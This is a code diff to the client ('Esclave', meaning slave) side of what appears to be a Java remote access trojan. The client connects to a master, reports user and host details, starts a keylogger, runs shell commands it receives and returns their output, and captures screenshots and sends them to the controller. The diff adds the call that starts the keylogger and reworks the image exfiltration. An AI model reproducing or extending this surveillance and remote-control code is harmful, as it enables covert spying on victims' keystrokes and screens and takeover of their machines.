@@ -3,23 +3,20 @@ package client;
 import java.awt.AWTException;
 import java.awt.Robot;
 import java.io.BufferedInputStream;
-import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.io.PrintStream;
-import java.net.Inet4Address;
 import java.net.InetAddress;
 import java.net.Socket;
-import java.net.UnknownHostException;
 
-import constante.Constante;
 import remote.action.CMD;
 import remote.action.Keylogging;
 import remote.action.Notification;
 import remote.action.RemoteActions;
 import remote.action.ScreenShot;
+import send.specific.object.SendImage;
 import send.specific.object.SendSpecificObject;
+import constante.Constante;
 
 public class Esclave {
 
@@ -29,6 +26,11 @@ public class Esclave {
 
 	private static ObjectInputStream in;
 	private static ObjectOutputStream out;
+
+	public static ObjectOutputStream getOut() {
+		return out;
+	}
+
 	private Socket s;
 	private Keylogging klgg;
 	private Robot robot;
@@ -38,6 +40,7 @@ public class Esclave {
 
 		try {
 			s = new Socket(InetAddress.getLocalHost(), portMaitre);
+
 			addresse = s.getInetAddress();
 
 			out = new ObjectOutputStream(s.getOutputStream());
@@ -54,25 +57,27 @@ public class Esclave {
 					+ user_country);
 			out.flush();
 			klgg = new Keylogging(this);
+			klgg.start();
 			robot = new Robot();
-			this.receive();
-		} catch (IOException | AWTException e) {
+			this.receive(this);
+		} catch (AWTException | IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 
 	}
 
-	public void receive() throws ClassNotFoundException, IOException,
-			InterruptedException {
+	public void receive(Esclave esclave) throws ClassNotFoundException,
+			IOException, InterruptedException {
 		Thread recevoir = new Thread("Receive") {
+			@Override
 			public void run() {
 
 				try {
 					while (true) {
 						Object action;
 
-						action = (Object) in.readObject();
+						action = in.readObject();
 
 						if (action instanceof Integer) {
 							Integer code = (Integer) action;
@@ -84,48 +89,51 @@ public class Esclave {
 							} else if (code.equals(Constante.code_cmd)) {
 								// System.out.println("[debug] Nouveau requete CMD: ");
 
-								if (cmd == null)
+								if (cmd == null) {
 									cmd = new CMD();
-								action = (Object) in.readObject();
+									// System.out.println("[debug] New cmd");
+								}
+								action = in.readObject();
 								if (action instanceof String) {
 									String instruction = (String) action;
-									String res = cmd
-											.nouvellecommande(instruction);
+									String res = "";
+									res = cmd.nouvellecommande(instruction,
+											esclave);
 									// System.out.println("[debug]"+res);
-									out.writeObject(Constante.code_cmd);
-									out.flush();
-									out.writeObject(res);
-									out.flush();
+
+									if (!res.equals(Constante.code_message_cmd)) {
+										out.writeObject(Constante.code_cmd);
+										out.flush();
+										out.writeObject(res);
+										out.flush();
+									}
 								}
 							} else {
 								System.out.println("Objet non identifie");
 							}
 						} else if (action instanceof RemoteActions) {
 							RemoteActions remoteaction = (RemoteActions) action;
-							Object result = ((RemoteActions) remoteaction)
-									.executer(robot);
-							if (result != null) {
+							if (remoteaction instanceof ScreenShot) {
+								ScreenShot screenshot = (ScreenShot) remoteaction;
+								Object result = screenshot.executer(robot);
+								
+								if (result != null) {
 
-								out.writeObject(Constante.code_vnc);
-								out.flush();
-								if (result instanceof ScreenShot) {
-									byte[] size = ((ScreenShot) result)
-											.getsize();
+									byte[] size = (byte[]) screenshot.getsize();
 									if (!size.equals(null)) {
-										out.writeObject(size);
-										;
-										out.writeObject(result);
+										out.writeObject(Constante.code_vnc);
 										out.flush();
-										out.reset();
+									//	System.out.println("[debug] Envoi image");
+										SendImage.sendImage(out, size, (byte[]) result);
 									}
-								} else {
-									out.writeObject(result);
-									out.flush();
-									out.reset();
 								}
+							} else {
+								Object result = remoteaction.executer(robot);
 							}
+
 						}
 					}
+
 				} catch (ClassNotFoundException | IOException e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
